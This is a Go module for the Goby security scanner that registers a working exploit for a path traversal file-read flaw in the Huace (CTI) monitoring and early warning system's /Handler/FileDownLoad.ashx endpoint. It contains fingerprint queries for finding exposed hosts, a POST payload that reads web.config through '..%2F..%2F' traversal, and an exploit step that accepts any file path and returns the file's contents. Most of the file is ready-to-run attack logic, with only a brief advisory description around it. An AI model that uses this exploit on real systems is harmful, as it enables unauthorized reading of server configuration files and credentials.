package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "CTI monitoring and early warning system /Handler/FileDownLoad.ashx File Read Vulnerability",
    "Description": "<p>The products and solutions of Shanghai CTI Navigation Technology Co., Ltd. have been widely used in construction and infrastructure, geospatial information, resources and public utilities, robotics and unmanned driving, etc., and have penetrated into natural resources, construction, transportation, water conservancy, electric power, agriculture, education, environmental protection and other industries, and entered emerging fields such as smart city, autonomous driving, and artificial intelligence.</p><p>There is a file reading vulnerability in the /Handler/FileDownLoad.ashx path of CTI Monitoring and Early Warning System, and an attacker can exploit this vulnerability to read system files and obtain sensitive information.</p>",
    "Product": "China-Test-MWS-2.2",
    "Homepage": "https://www.huace.cn/",
    "DisclosureDate": "2024-04-22",
    "PostTime": "2024-04-22",
    "Author": "兰公子",
    "FofaQuery": "body=\"App_Themes/Flat/Login/logo-top.png\" || body=\"华测监测预警系统\"",
    "GobyQuery": "body=\"App_Themes/Flat/Login/logo-top.png\" || body=\"华测监测预警系统\"",
    "Level": "3",
    "Impact": "<p>There is a file reading vulnerability in the /Handler/FileDownLoad.ashx path of CTI Monitoring and Early Warning System, and an attacker can exploit this vulnerability to read system files and obtain sensitive information.</p>",
    "Recommendation": "<p>At present, there is no detailed solution to provide, please pay attention to the manufacturer's homepage update: <a href=\"https://www.huace.cn/\">https://www.huace.cn/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filepath",
            "type": "input",
            "value": "..%2F..%2Fweb.config",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/Handler/FileDownLoad.ashx",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "filename=1&filepath=..%2F..%2Fweb.config"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "xml",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/Handler/FileDownLoad.ashx"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/Handler/FileDownLoad.ashx",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "filename=1&filepath={{{filepath}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "File Read",
        "HW-2023"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.2",
    "Translation": {
        "CN": {
            "Name": "华测监测预警系统 /Handler/FileDownLoad.ashx 文件读取漏洞",
            "Product": "华测监测预警系统2.2",
            "Description": "<p>上海华测导航技术股份有限公司的产品及解决方案已广泛应用于建筑与基建、地理空间信息、资源与公共事业、机器人与无人驾驶等板块，深入自然资源、建筑施工、交通、水利、电力、农业、教育、环保等行业，并进入智慧城市、自动驾驶、人工智能等新兴领域。<br></p><p>华测监测预警系统 /Handler/FileDownLoad.ashx 路径存在文件读取漏洞，攻击者可以利用该漏洞读取系统文件，获取敏感信息。<br></p>",
            "Recommendation": "<p>目前没有详细的解决方案提供，请关注厂商主页更新：<a href=\"https://www.huace.cn/\">https://www.huace.cn/</a><br></p>",
            "Impact": "<p>华测监测预警系统 /Handler/FileDownLoad.ashx 路径存在文件读取漏洞，攻击者可以利用该漏洞读取系统文件，获取敏感信息。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取",
                "HW-2023"
            ]
        },
        "EN": {
            "Name": "CTI monitoring and early warning system /Handler/FileDownLoad.ashx File Read Vulnerability",
            "Product": "China-Test-MWS-2.2",
            "Description": "<p>The products and solutions of Shanghai CTI Navigation Technology Co., Ltd. have been widely used in construction and infrastructure, geospatial information, resources and public utilities, robotics and unmanned driving, etc., and have penetrated into natural resources, construction, transportation, water conservancy, electric power, agriculture, education, environmental protection and other industries, and entered emerging fields such as smart city, autonomous driving, and artificial intelligence.<br></p><p>There is a file reading vulnerability in the /Handler/FileDownLoad.ashx path of CTI Monitoring and Early Warning System, and an attacker can exploit this vulnerability to read system files and obtain sensitive information.<br></p>",
            "Recommendation": "<p>At present, there is no detailed solution to provide, please pay attention to the manufacturer's homepage update: <a href=\"https://www.huace.cn/\">https://www.huace.cn/</a><br></p>",
            "Impact": "<p>There is a file reading vulnerability in the /Handler/FileDownLoad.ashx path of CTI Monitoring and Early Warning System, and an attacker can exploit this vulnerability to read system files and obtain sensitive information.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read",
                "HW-2023"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10967"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}